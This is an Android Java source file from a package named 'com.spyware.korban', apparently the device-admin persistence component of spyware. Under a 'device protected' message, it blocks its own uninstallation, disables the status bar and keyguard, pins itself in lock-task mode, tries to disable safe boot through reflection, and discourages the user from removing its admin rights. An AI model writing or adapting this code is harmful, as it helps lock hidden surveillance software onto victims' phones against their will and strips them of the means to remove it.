package com.spyware.korban;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "DEVICE_ADMIN";

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Log.d(TAG, "✅ Device Admin ENABLED");
        Toast.makeText(context, "Perangkat dilindungi", Toast.LENGTH_SHORT).show();
        applyProtection(context);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Log.d(TAG, "⚠️ Device Admin DISABLED");
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Perangkat ini dilindungi. Yakin mau matikan?";
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        Log.d(TAG, "Password changed");
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
        Log.d(TAG, "Password failed");
    }

    // ═══════════════════════════════════════════════
    // APPLY PROTECTION
    // ═══════════════════════════════════════════════
    public static void applyProtection(Context context) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(context, MyDeviceAdminReceiver.class);

            if (dpm == null) return;

            // ═══ 1. BLOCK UNINSTALL (WAJIB) ═══
            try {
                dpm.setUninstallBlocked(admin, context.getPackageName(), true);
                Log.d(TAG, "✅ Uninstall blocked");
            } catch (Exception e) {
                Log.e(TAG, "setUninstallBlocked: " + e.getMessage());
            }

            // ═══ CEK DEVICE OWNER ═══
            boolean isOwner = false;
            try {
                isOwner = dpm.isDeviceOwnerApp(context.getPackageName());
            } catch (Exception e) {}

            if (isOwner) {
                Log.d(TAG, "👑 Device Owner mode");

                // 2. StatusBar disabled
                try {
                    dpm.setStatusBarDisabled(admin, true);
                    Log.d(TAG, "✅ StatusBar disabled");
                } catch (Exception e) {
                    Log.e(TAG, "setStatusBarDisabled: " + e.getMessage());
                }

                // 3. Keyguard disabled
                try {
                    dpm.setKeyguardDisabled(admin, true);
                    Log.d(TAG, "✅ Keyguard disabled");
                } catch (Exception e) {
                    Log.e(TAG, "setKeyguardDisabled: " + e.getMessage());
                }

                // 4. Lock Task packages
                try {
                    dpm.setLockTaskPackages(admin, new String[]{ context.getPackageName() });
                    Log.d(TAG, "✅ LockTask packages set");
                } catch (Exception e) {
                    Log.e(TAG, "setLockTaskPackages: " + e.getMessage());
                }

                // 5. Set maximum failed passwords (biar gak wipe)
                try {
                    dpm.setMaximumFailedPasswordsForWipe(admin, 1000);
                    Log.d(TAG, "✅ Max failed password = 1000");
                } catch (Exception e) {
                    Log.e(TAG, "setMaxFailedPasswords: " + e.getMessage());
                }

                // 6. Safe boot disable (via reflection)
                disableSafeBoot(dpm, admin);
            }

        } catch (Exception e) {
            Log.e(TAG, "applyProtection: " + e.getMessage());
        }
    }

    // ═══════════════════════════════════════════════
    // DISABLE SAFE BOOT (via reflection)
    // ═══════════════════════════════════════════════
    private static void disableSafeBoot(DevicePolicyManager dpm, ComponentName admin) {
        try {
            java.lang.reflect.Method method = DevicePolicyManager.class.getMethod(
                "setSafeBootDisabled",
                ComponentName.class,
                boolean.class
            );
            method.invoke(dpm, admin, true);
            Log.d(TAG, "✅ SafeBoot disabled (reflection)");
        } catch (Exception e) {
            Log.e(TAG, "setSafeBootDisabled reflection failed: " + e.getMessage());
        }
    }
}